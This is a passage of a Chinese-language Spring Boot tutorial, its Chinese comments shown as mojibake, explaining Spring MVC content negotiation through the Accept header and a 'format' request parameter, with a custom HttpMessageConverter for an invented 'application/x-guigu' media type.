class="hljs-comment">//æœ¬èŠ‚é‡ç‚¹</span><br>            <span class="hljs-comment">//å†…å®¹åå•†ï¼ˆæµè§ˆå™¨é»˜è®¤ä¼šä»¥è¯·æ±‚å¤´(å‚æ•°Accept)çš„æ–¹å¼å‘Šè¯‰æœåŠ¡å™¨ä»–èƒ½æ¥å—ä»€ä¹ˆæ ·çš„å†…å®¹ç±»å‹ï¼‰</span><br>            <span class="hljs-type">MediaType</span> <span class="hljs-variable">selectedMediaType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">MediaType</span> <span class="hljs-variable">contentType</span> <span class="hljs-operator">=</span> outputMessage.getHeaders().getContentType();<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isContentTypePreset</span> <span class="hljs-operator">=</span> contentType != <span class="hljs-literal">null</span> &amp;&amp; contentType.isConcrete();<br>            <span class="hljs-keyword">if</span> (isContentTypePreset) &#123;<br>                <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                    logger.debug(<span class="hljs-string">&quot;Found &#x27;Content-Type:&quot;</span> + contentType + <span class="hljs-string">&quot;&#x27; in response&quot;</span>);<br>                &#125;<br>                selectedMediaType = contentType;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> inputMessage.getServletRequest();<br>                List&lt;MediaType&gt; acceptableTypes = getAcceptableMediaTypes(request);<br>                <span class="hljs-comment">//æœåŠ¡å™¨æœ€ç»ˆæ ¹æ®è‡ªå·±è‡ªèº«çš„èƒ½åŠ›ï¼Œå†³å®šæœåŠ¡å™¨èƒ½ç”Ÿäº§å‡ºä»€ä¹ˆæ ·å†…å®¹ç±»å‹çš„æ•°æ®</span><br>                List&lt;MediaType&gt; producibleTypes = getProducibleMediaTypes(request, valueType, targetType);<br>            ...<br>            <br>&#125;<br>    <br>    <span class="hljs-comment">//åœ¨AbstractMessageConverterMethodArgumentResolverç±»å†…</span><br>   <span class="hljs-keyword">private</span> List&lt;MediaType&gt; <span class="hljs-title function_">getAcceptableMediaTypes</span><span class="hljs-params">(HttpServletRequest request)</span><br><span class="hljs-keyword">throws</span> HttpMediaTypeNotAcceptableException &#123;<br><br>        <span class="hljs-comment">//å†…å®¹åå•†ç®¡ç†å™¨ é»˜è®¤ä½¿ç”¨åŸºäºè¯·æ±‚å¤´çš„ç­–ç•¥</span><br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.contentNegotiationManager.resolveMediaTypes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request));<br>&#125;<br>        <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ContentNegotiationManager</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ContentNegotiationStrategy</span>, MediaTypeFileExtensionResolver &#123;<br><br>    ...<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ContentNegotiationManager</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-built_in">this</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HeaderContentNegotiationStrategy</span>());<span class="hljs-comment">//å†…å®¹åå•†ç®¡ç†å™¨ é»˜è®¤ä½¿ç”¨åŸºäºè¯·æ±‚å¤´çš„ç­–ç•¥</span><br>&#125;<br>    <br>    <span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> List&lt;MediaType&gt; <span class="hljs-title function_">resolveMediaTypes</span><span class="hljs-params">(NativeWebRequest request)</span> <span class="hljs-keyword">throws</span> HttpMediaTypeNotAcceptableException &#123;<br><span class="hljs-keyword">for</span> (ContentNegotiationStrategy strategy : <span class="hljs-built_in">this</span>.strategies) &#123;<br>List&lt;MediaType&gt; mediaTypes = strategy.resolveMediaTypes(request);<br><span class="hljs-keyword">if</span> (mediaTypes.equals(MEDIA_TYPE_ALL_LIST)) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">return</span> mediaTypes;<br>&#125;<br><span class="hljs-keyword">return</span> MEDIA_TYPE_ALL_LIST;<br>&#125;<br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//åŸºäºè¯·æ±‚å¤´çš„ç­–ç•¥</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HeaderContentNegotiationStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ContentNegotiationStrategy</span> &#123;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> HttpMediaTypeNotAcceptableException if the &#x27;Accept&#x27; header cannot be parsed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> List&lt;MediaType&gt; <span class="hljs-title function_">resolveMediaTypes</span><span class="hljs-params">(NativeWebRequest request)</span><br><span class="hljs-keyword">throws</span> HttpMediaTypeNotAcceptableException &#123;<br><br>String[] headerValueArray = request.getHeaderValues(HttpHeaders.ACCEPT);<br><span class="hljs-keyword">if</span> (headerValueArray == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">return</span> MEDIA_TYPE_ALL_LIST;<br>&#125;<br><br>List&lt;String&gt; headerValues = Arrays.asList(headerValueArray);<br><span class="hljs-keyword">try</span> &#123;<br>List&lt;MediaType&gt; mediaTypes = MediaType.parseMediaTypes(headerValues);<br>MediaType.sortBySpecificityAndQuality(mediaTypes);<br><span class="hljs-keyword">return</span> !CollectionUtils.isEmpty(mediaTypes) ? mediaTypes : MEDIA_TYPE_ALL_LIST;<br>&#125;<br><span class="hljs-keyword">catch</span> (InvalidMediaTypeException ex) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMediaTypeNotAcceptableException</span>(<br><span class="hljs-string">&quot;Could not parse &#x27;Accept&#x27; header &quot;</span> + headerValues + <span class="hljs-string">&quot;: &quot;</span> + ex.getMessage());<br>&#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¼€å¯æµè§ˆå™¨å‚æ•°æ–¹å¼å†…å®¹åå•†åŠŸèƒ½"><a href="#å¼€å¯æµè§ˆå™¨å‚æ•°æ–¹å¼å†…å®¹åå•†åŠŸèƒ½" class="headerlink" title="å¼€å¯æµè§ˆå™¨å‚æ•°æ–¹å¼å†…å®¹åå•†åŠŸèƒ½"></a>å¼€å¯æµè§ˆå™¨å‚æ•°æ–¹å¼å†…å®¹åå•†åŠŸèƒ½</h3><p>ä¸ºäº†æ–¹ä¾¿å†…å®¹åå•†ï¼Œå¼€å¯åŸºäºè¯·æ±‚å‚æ•°çš„å†…å®¹åå•†åŠŸèƒ½ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">mvc:</span><br>    <span class="hljs-attr">contentnegotiation:</span><br>      <span class="hljs-attr">favor-parameter:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment">#å¼€å¯è¯·æ±‚å‚æ•°å†…å®¹åå•†æ¨¡å¼</span><br></code></pre></td></tr></table></figure><p>å†…å®¹åå•†ç®¡ç†å™¨ï¼Œå°±ä¼šå¤šäº†ä¸€ä¸ª<code>ParameterContentNegotiationStrategy</code>ï¼ˆç”±Springå®¹å™¨æ³¨å…¥ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParameterContentNegotiationStrategy</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMappingContentNegotiationStrategy</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">parameterName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;format&quot;</span>;<span class="hljs-comment">//</span><br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Create an instance with the given map of file extensions and media types.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">ParameterContentNegotiationStrategy</span><span class="hljs-params">(Map&lt;String, MediaType&gt; mediaTypes)</span> &#123;<br><span class="hljs-built_in">super</span>(mediaTypes);<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Set the name of the parameter to use to determine requested media types.</span><br><span class="hljs-comment"> * &lt;p&gt;By default this is set to &#123;<span class="hljs-doctag">@code</span> &quot;format&quot;&#125;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParameterName</span><span class="hljs-params">(String parameterName)</span> &#123;<br>Assert.notNull(parameterName, <span class="hljs-string">&quot;&#x27;parameterName&#x27; is required&quot;</span>);<br><span class="hljs-built_in">this</span>.parameterName = parameterName;<br>&#125;<br><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getParameterName</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.parameterName;<br>&#125;<br><br><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> String <span class="hljs-title function_">getMediaTypeKey</span><span class="hljs-params">(NativeWebRequest request)</span> &#123;<br><span class="hljs-keyword">return</span> request.getParameter(getParameterName());<br>&#125;<br>    <br>    <span class="hljs-comment">//---ä»¥ä¸‹æ–¹æ³•åœ¨AbstractMappingContentNegotiationStrategyç±»</span><br>    <br>    <span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> List&lt;MediaType&gt; <span class="hljs-title function_">resolveMediaTypes</span><span class="hljs-params">(NativeWebRequest webRequest)</span><br><span class="hljs-keyword">throws</span> HttpMediaTypeNotAcceptableException &#123;<br><br><span class="hljs-keyword">return</span> resolveMediaTypeKey(webRequest, getMediaTypeKey(webRequest));<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * An alternative to &#123;<span class="hljs-doctag">@link</span> #resolveMediaTypes(NativeWebRequest)&#125; that accepts</span><br><span class="hljs-comment"> * an already extracted key.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@since</span> 3.2.16</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> List&lt;MediaType&gt; <span class="hljs-title function_">resolveMediaTypeKey</span><span class="hljs-params">(NativeWebRequest webRequest, <span class="hljs-meta">@Nullable</span> String key)</span><br><span class="hljs-keyword">throws</span> HttpMediaTypeNotAcceptableException &#123;<br><br><span class="hljs-keyword">if</span> (StringUtils.hasText(key)) &#123;<br><span class="hljs-type">MediaType</span> <span class="hljs-variable">mediaType</span> <span class="hljs-operator">=</span> lookupMediaType(key);<br><span class="hljs-keyword">if</span> (mediaType != <span class="hljs-literal">null</span>) &#123;<br>handleMatch(key, mediaType);<br><span class="hljs-keyword">return</span> Collections.singletonList(mediaType);<br>&#125;<br>mediaType = handleNoMatch(webRequest, key);<br><span class="hljs-keyword">if</span> (mediaType != <span class="hljs-literal">null</span>) &#123;<br>addMapping(key, mediaType);<br><span class="hljs-keyword">return</span> Collections.singletonList(mediaType);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> MEDIA_TYPE_ALL_LIST;<br>&#125;<br>    <br><br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åï¼Œæµè§ˆå™¨åœ°å€è¾“å…¥å¸¦formatå‚æ•°çš„URLï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/test/</span>person?format=json<br>æˆ–<br>http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/test/</span>person?format=xml<br></code></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œåç«¯ä¼šæ ¹æ®å‚æ•°formatçš„å€¼ï¼Œè¿”å›å¯¹åº”jsonæˆ–xmlæ ¼å¼çš„æ•°æ®ã€‚</p><h2 id="41ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-è‡ªå®šä¹‰MessageConverter"><a href="#41ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-è‡ªå®šä¹‰MessageConverter" class="headerlink" title="41ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-è‡ªå®šä¹‰MessageConverter"></a>41ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-è‡ªå®šä¹‰MessageConverter</h2><p><strong>å®ç°å¤šåè®®æ•°æ®å…¼å®¹ã€‚jsonã€xmlã€x-guigu</strong>ï¼ˆè¿™ä¸ªæ˜¯è‡ªåˆ›çš„ï¼‰</p><ol><li><p><code>@ResponseBody</code> å“åº”æ•°æ®å‡ºå» è°ƒç”¨ <code>RequestResponseBodyMethodProcessor</code> å¤„ç†</p></li><li><p>Processor å¤„ç†æ–¹æ³•è¿”å›å€¼ã€‚é€šè¿‡ <code>MessageConverter</code>å¤„ç†</p></li><li><p>æ‰€æœ‰ <code>MessageConverter</code> åˆèµ·æ¥å¯ä»¥æ”¯æŒå„ç§åª’ä½“ç±»å‹æ•°æ®çš„æ“ä½œï¼ˆè¯»ã€å†™ï¼‰</p></li><li><p>å†…å®¹åå•†æ‰¾åˆ°æœ€ç»ˆçš„ <code>messageConverter</code></p></li></ol><p>SpringMVCçš„ä»€ä¹ˆåŠŸèƒ½ï¼Œä¸€ä¸ªå…¥å£ç»™å®¹å™¨ä¸­æ·»åŠ ä¸€ä¸ª  <code>WebMvcConfigurer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span> &#123;<br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> WebMvcConfigurer <span class="hljs-title function_">webMvcConfigurer</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebMvcConfigurer</span>() &#123;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">extendMessageConverters</span><span class="hljs-params">(List&lt;HttpMessageConverter&lt;?&gt;&gt; converters)</span> &#123;<br>                converters.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GuiguMessageConverter</span>());<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * è‡ªå®šä¹‰çš„Converter</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GuiguMessageConverter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpMessageConverter</span>&lt;Person&gt; &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">canRead</span><span class="hljs-params">(Class&lt;?&gt; clazz, MediaType mediaType)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">canWrite</span><span class="hljs-params">(Class&lt;?&gt; clazz, MediaType mediaType)</span> &#123;<br>        <span class="hljs-keyword">return</span> clazz.isAssignableFrom(Person.class);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æœåŠ¡å™¨è¦ç»Ÿè®¡æ‰€æœ‰MessageConverteréƒ½èƒ½å†™å‡ºå“ªäº›å†…å®¹ç±»å‹</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * application/x-guigu</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;MediaType&gt; <span class="hljs-title function_">getSupportedMediaTypes</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> MediaType.parseMediaTypes(<span class="hljs-string">&quot;application/x-guigu&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">read</span><span class="hljs-params">(Class&lt;? extends Person&gt; clazz, HttpInputMessage inputMessage)</span> <span class="hljs-keyword">throws</span> IOException, HttpMessageNotReadableException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(Person person, MediaType contentType, HttpOutputMessage outputMessage)</span> <span class="hljs-keyword">throws</span> IOException, HttpMessageNotWritableException &#123;<br>        <span class="hljs-comment">//è‡ªå®šä¹‰åè®®æ•°æ®çš„å†™å‡º</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> person.getUserName()+<span class="hljs-string">&quot;;&quot;</span>+person.getAge()+<span class="hljs-string">&quot;;&quot;</span>+person.getBirth();<br><br><br>        <span class="hljs-comment">//å†™å‡ºå»</span><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> outputMessage.getBody();<br>        body.write(data.getBytes());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseTestController</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 1ã€æµè§ˆå™¨å‘è¯·æ±‚ç›´æ¥è¿”å› xml    [application/xml]        jacksonXmlConverter</span><br><span class="hljs-comment">     * 2ã€å¦‚æœæ˜¯ajaxè¯·æ±‚ è¿”å› json   [application/json]      jacksonJsonConverter</span><br><span class="hljs-comment">     * 3ã€å¦‚æœç¡…è°·appå‘è¯·æ±‚ï¼Œè¿”å›è‡ªå®šä¹‰åè®®æ•°æ®  [appliaction/x-guigu]   xxxxConverter</span><br><span class="hljs-comment">     *          å±æ€§å€¼1;å±æ€§å€¼2;</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * æ­¥éª¤ï¼š</span><br><span class="hljs-comment">     * 1ã€æ·»åŠ è‡ªå®šä¹‰çš„MessageConverterè¿›ç³»ç»Ÿåº•å±‚</span><br><span class="hljs-comment">     * 2ã€ç³»ç»Ÿåº•å±‚å°±ä¼šç»Ÿè®¡å‡ºæ‰€æœ‰MessageConverterèƒ½æ“ä½œå“ªäº›ç±»å‹</span><br><span class="hljs-comment">     * 3ã€å®¢æˆ·ç«¯å†…å®¹åå•† [guigu---&gt;guigu]</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * ä½œä¸šï¼šå¦‚ä½•ä»¥å‚æ•°çš„æ–¹å¼è¿›è¡Œå†…å®¹åå•†</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ResponseBody</span>  <span class="hljs-comment">//åˆ©ç”¨è¿”å›å€¼å¤„ç†å™¨é‡Œé¢çš„æ¶ˆæ¯è½¬æ¢å™¨è¿›è¡Œå¤„ç†</span><br>    <span class="hljs-meta">@GetMapping(value = &quot;/test/person&quot;)</span><br>    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">getPerson</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">28</span>);<br>        person.setBirth(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br>        person.setUserName(<span class="hljs-string">&quot;zhangsan&quot;</span>);<br>        <span class="hljs-keyword">return</span> person;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨Postmanå‘é€<code>/test/person</code>ï¼ˆè¯·æ±‚å¤´<code>Accept:application/x-guigu</code>)ï¼Œå°†è¿”å›è‡ªå®šä¹‰åè®®æ•°æ®çš„å†™å‡ºã€‚</p><h2 id="42ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-æµè§ˆå™¨ä¸PostManå†…å®¹åå•†å®Œå…¨é€‚é…"><a href="#42ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-æµè§ˆå™¨ä¸PostManå†…å®¹åå•†å®Œå…¨é€‚é…" class="headerlink" title="42ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-æµè§ˆå™¨ä¸PostManå†…å®¹åå•†å®Œå…¨é€‚é…"></a>42ã€å“åº”å¤„ç†-ã€æºç åˆ†æã€‘-æµè§ˆå™¨ä¸PostManå†…å®¹åå•†å®Œå…¨é€‚é…</h2><p>å‡è®¾ä½ æƒ³åŸºäºè‡ªå®šä¹‰è¯·æ±‚å‚æ•°çš„è‡ªå®šä¹‰å†…å®¹åå•†åŠŸèƒ½ã€‚</p><p>æ¢å¥è¯ï¼Œåœ¨åœ°å€æ è¾“å…¥<code>http://localhost:8080/test/person?format=gg</code>è¿”å›æ•°æ®ï¼Œè·Ÿ<code>http://localhost:8080/test/person</code>ä¸”è¯·æ±‚å¤´å‚æ•°<code>Accept:application/x-guigu</code>çš„è¿”å›è‡ªå®šä¹‰åè®®æ•°æ®çš„ä¸€è‡´ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span> <span class="hljs-comment">/*implements WebMvcConfigurer*/</span> &#123;<br><br>    <span class="hljs-comment">//1ã€WebMvcConfigurerå®šåˆ¶åŒ–SpringMVCçš„åŠŸèƒ½</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> WebMvcConfigurer <span class="hljs-title function_">webMvcConfigurer</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebMvcConfigurer</span>() &#123;<br><br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * è‡ªå®šä¹‰å†…å®¹åå•†ç­–ç•¥</span><br><span class="hljs-comment">             * <span class="hljs-doctag">@param</span> configurer</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configureContentNegotiation</span><span class="hljs-params">(ContentNegotiationConfigurer configurer)</span> &#123;<br>                <span class="hljs-comment">//Map&lt;String, MediaType&gt; mediaTypes</span><br>                Map&lt;String, MediaType&gt; mediaTypes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>                mediaTypes.put(<span class="hljs-string">&quot;json&quot;</span>,MediaType.APPLICATION_JSON);<br>                mediaTypes.put(<span class="hljs-string">&quot;xml&quot;</span>,MediaType.APPLICATION_XML);<br>                <span class="hljs-comment">//è‡ªå®šä¹‰åª’ä½“ç±»å‹</span><br>                mediaTypes.put(<span class="hljs-string">&quot;gg&quot;</span>,MediaType.parseMediaType(<span 